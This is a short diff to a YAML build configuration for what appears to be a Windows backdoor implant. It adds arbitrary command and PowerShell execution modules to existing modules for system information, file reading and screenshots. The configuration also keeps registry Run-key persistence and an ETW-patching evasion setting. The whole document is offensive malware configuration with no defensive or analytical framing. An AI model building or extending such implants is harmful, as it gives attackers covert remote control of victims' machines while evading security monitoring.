@@ -11,9 +11,13 @@ commands:
   - commands/cmd_sysinfo
   - commands/cmd_fileread
   - commands/cmd_screenshot
+  - commands/cmd_exec
+  - commands/cmd_exec_powershell
 
 arch: arch/backdoor
 persist: persist/registry_run
+
+resources: true
 
 evasion:
   - evasion/etw_patch
